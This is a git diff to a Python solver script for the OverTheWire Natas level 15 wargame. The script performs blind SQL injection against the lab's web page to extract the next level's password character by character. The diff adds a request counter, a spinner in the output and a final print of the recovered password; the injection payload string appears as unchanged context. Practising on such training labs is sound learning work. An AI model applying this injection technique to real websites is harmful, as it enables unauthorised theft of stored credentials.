@@ -14,11 +14,15 @@ headers = {
 }
 url = "http://natas15.natas.labs.overthewire.org/index.php?debug"
 
+r = 0
+
 
 def make_request(params):
     global headers
     global url
     global password
+    global r
+    r = r+1
     payload = 'natas16\" and SUBSTRING(password, ' + \
         str(params["x"]) + ', 1) LIKE BINARY \"%' + params["i"] + '%\"#'
 
@@ -30,9 +34,9 @@ def make_request(params):
     except req.exceptions.Timeout:
         print(Fore.LIGHTRED_EX +
               "\n[!] Timeout, Continueing again" + Fore.WHITE)
-    #print("[*]" + payload + " ==> " + password)
+    fancy = ["-", "\\", "|", "/", ]
     sys.stdout.write(
-        Fore.LIGHTGREEN_EX + "[+] " + params["i"] + "  ==> " + Fore.GREEN + password+"\r" + Fore.WHITE)
+        Fore.LIGHTGREEN_EX + "["+fancy[ord(params["i"]) % 4]+"] " + str(r) + " -- " + params["i"] + "  ==> " + Fore.GREEN + password+"\r" + Fore.WHITE)
     sys.stdout.flush()
     return {"res": res, "char": params["i"]}
 
@@ -56,3 +60,5 @@ for abrar in range(32):
     except KeyboardInterrupt:
         exit(
             Fore.RED + "\n[-] Detected Keyboard interrupt. Terminating...." + Fore.WHITE)
+
+print(Fore.BLUE+"[!] Password = " + password + Fore.WHITE)
